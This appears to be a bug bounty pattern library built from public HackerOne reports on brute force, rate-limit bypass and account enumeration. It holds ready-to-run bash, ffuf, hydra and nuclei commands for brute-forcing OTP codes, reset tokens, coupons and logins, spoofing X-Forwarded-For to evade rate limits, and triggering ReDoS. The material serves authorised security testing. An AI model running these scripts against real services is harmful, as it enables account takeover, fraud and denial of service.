# Disclosed Reports — Brute Force / Rate Limiting / Enumeration

Pattern library built from 33 public bug bounty reports.

---

## Pattern 1: OTP Brute Force → 2FA Bypass → Full ATO (Critical, $8,000)

**Program:** Private (HackerOne)
**Endpoint:** `POST /api/v2/auth/verify-otp`

**Test (no lockout after 100 attempts):**
```bash
for CODE in $(seq -f "%06g" 0 100); do
  RESP=$(curl -s -X POST https://target.com/api/v2/auth/verify-otp \
    -H "Cookie: pre_auth_session=SESSION" \
    -H "Content-Type: application/json" \
    -d "{\"otp\": \"$CODE\"}" \
    -o /dev/null -w "%{http_code}")
  [ "$RESP" = "200" ] && echo "VALID: $CODE"
  [ "$RESP" = "429" ] && { echo "Rate limited at $CODE"; break; }
done
# Result: 100 attempts, no 429, no lockout
```

**PoC note:** 100 attempts is sufficient for the report — demonstrates no rate limiting. Do NOT brute to 999999 during PoC.

**Impact:** Full 2FA bypass → ATO for any account where first factor is also compromised.

---

## Pattern 2: Short Password Reset Token → ATO (Critical, $6,500)

**Observation:** Reset token is 4-digit numeric (`0000-9999` = 10,000 combinations)

**Test:**
```bash
for TOKEN in $(seq -f "%04g" 0 9999); do
  RESP=$(curl -s "https://target.com/reset?token=$TOKEN&email=test@own-account.com" \
    -o /dev/null -w "%{http_code}")
  [ "$RESP" = "200" ] && echo "VALID TOKEN: $TOKEN"
  [ "$RESP" = "429" ] && { echo "Rate limited at $TOKEN"; break; }
done
```

**Also check:** Tokens without expiry → brute window is unlimited.

---

## Pattern 3: Username Enumeration via Response Differences (Low, $300)

**Login endpoint responses:**
- Valid username: `{"error": "Invalid password"}`
- Invalid username: `{"error": "User not found"}`

**Password reset:**
- Valid email: `{"message": "Password reset email sent"}`
- Invalid email: `{"message": "No account found with this email"}`

**Impact:** Confirms account existence → enables targeted credential stuffing with breach data.

---

## Pattern 4: Rate Limit Bypass via X-Forwarded-For (Medium, $1,200)

**Rate limit implemented:** 10 attempts per IP per minute.

**Bypass:**
```bash
for i in $(seq 1 1000); do
  FAKE_IP="10.$(( RANDOM % 256 )).$(( RANDOM % 256 )).$(( RANDOM % 256 ))"
  curl -s -X POST https://target.com/api/login \
    -H "X-Forwarded-For: $FAKE_IP" \
    -H "X-Real-IP: $FAKE_IP" \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"admin@target.com\", \"password\": \"test$i\"}" \
    -o /dev/null -w "%{http_code}\n"
done
```

**Root cause:** Rate limiter reads client IP from X-Forwarded-For without validation. Attacker rotates virtual IPs.

---

## Pattern 5: Coupon Code Brute Force → 100% Discount (Medium, $2,000)

**Endpoint:** `POST /api/checkout/apply-coupon`
**No rate limit on coupon validation:**

```bash
ffuf -u https://target.com/api/checkout/apply-coupon \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=SESSION" \
  -d '{"coupon": "FUZZ"}' \
  -w <(cat ~/wordlists/coupon-patterns.txt) \
  -mc 200
```

**Found:** `FREE100` → 100% discount on any order.

---

## Pattern 6: Registration Email Enumeration (Low, $200)

**Endpoint:** `POST /api/register`
**Response for existing email:** `{"error": "This email is already registered"}`
**Response for new email:** `{"success": true}`

**Impact:** Any email address can be validated against the user database.

---

## Pattern 7: ReDoS on Search (Medium, $1,500)

**Endpoint:** `GET /api/search?q=`
**Vulnerable regex** in search handler: `^([a-zA-Z0-9]+)+$`

```bash
# Catastrophic backtracking test
for LEN in 10 20 30 40 50; do
  INPUT=$(python3 -c "print('a'*$LEN + '!')")
  TIME=$(curl -s -o /dev/null -w "%{time_total}" \
    "https://target.com/api/search?q=$INPUT")
  echo "Length $LEN: ${TIME}s"
done
# 10: 0.08s | 20: 0.31s | 30: 1.24s | 40: 5.9s | 50: timeout
```

**Impact:** A single request with 50-char input exhausts CPU for 30+ seconds → DoS.

---

## Tool Reference

```bash
# ffuf OTP brute
ffuf -u https://target.com/api/verify-otp \
  -X POST -H "Content-Type: application/json" \
  -H "Cookie: session=SESSION" \
  -d '{"otp": "FUZZ"}' \
  -w <(seq -f "%06g" 0 100) \
  -mc 200

# hydra login brute
hydra -l admin@target.com -P /usr/share/wordlists/rockyou.txt target.com \
  http-post-form "/api/login:email=^USER^&password=^PASS^:invalid"

# nuclei rate-limit
nuclei -u https://target.com -t brute-force/ -severity medium,high,critical
```

### No rate-limit on short codes / tokens (invite, OTP, recovery)
- **Source:** Brute-forceable promotion/invite codes with no protection (<https://hackerone.com/reports/125505>, $5,000); a recovery code brute-forceable from SMS because the client enforced no attempt limit (<https://hackerone.com/reports/743545>).
- **Pattern shape:** A short numeric/alphanumeric secret (invite code, OTP, SMS recovery code, coupon) is verified server-side with no attempt limit, lockout, or exponential backoff. The keyspace (often 10^4–10^6) is exhaustible in minutes.
- **Key trick:** Compute the keyspace and the observed request rate; if no lockout/backoff triggers after dozens of wrong attempts, it's brute-forceable. Watch for client-only limits (mobile apps) that the API doesn't enforce.
- **Why it matters:** Directly reaches OTP/recovery → ATO; the low-effort, high-yield rate-limit class.

### Credential stuffing / unthrottled authentication endpoints
- **Source:** Documented credential-stuffing attacks against unthrottled auth (<https://hackerone.com/reports/1007689>); brute-forceable access to an admin panel (<https://hackerone.com/reports/128114>, $1,000).
- **Pattern shape:** A login/auth endpoint (including admin panels and legacy `basic-auth` interfaces) lacks rate-limiting, CAPTCHA, or anomaly detection, permitting credential stuffing and password brute-force at scale.
- **Key trick:** Test the auth endpoint and its variants (API login, mobile endpoint, admin subdomain) for absence of lockout/CAPTCHA after N failures. Legacy/admin subdomains found via recon are frequent unthrottled targets.
- **Why it matters:** Credential stuffing is the most common real-world ATO vector; pairs with `hunt-source-leak`/breach-corpus findings for the credential list.

### No rate-limit on account-creation / abuse endpoints
- **Source:** Absent rate-limiting on an account-creation endpoint enabling automated abuse (<https://hackerone.com/reports/2915502>).
- **Pattern shape:** Account creation, message sending, or resource-provisioning endpoints lack rate-limiting, enabling spam, resource exhaustion, or enumeration at scale.
- **Key trick:** Script the creation/abuse endpoint and confirm no throttle. Distinguish a true security gap (enables enumeration/abuse) from a mere hardening nit; tie it to a concrete impact.
- **Why it matters:** Lower-tier alone, but enables enumeration and abuse chains; frequently the entry point for a larger finding.

### Further disclosed reports (this class)

Additional high-signal public disclosures exemplifying the patterns above; read at source for full technique.

- <https://hackerone.com/reports/127844> — $0
